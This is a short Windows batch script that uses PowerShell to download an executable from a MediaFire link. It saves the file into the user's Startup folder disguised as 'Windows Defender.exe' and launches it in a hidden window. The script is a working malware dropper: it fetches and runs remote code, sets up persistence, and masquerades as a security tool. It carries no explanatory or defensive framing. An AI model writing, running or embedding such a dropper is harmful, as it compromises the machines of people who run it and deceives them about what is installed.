@echo off

set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
set "DownloadURL=https://download1648.mediafire.com/6sy2zu8qrvdgiOIUuKf8o0wNY-ciQez1wbHootS-ND96hds6FqAKjSyLHf1Yp8vcMtjvwGqCLSHiOm3aT86u01zjpANES0gULBz1WTocHvh3I2IUXyy6JQBccLKkVA6LmXjhwlb83foY9mdZRk5Aq9ckRKvxbT8TAi6GfL1GL28/yupdk7lb8o019em/x.exe"
set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender.exe"
powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
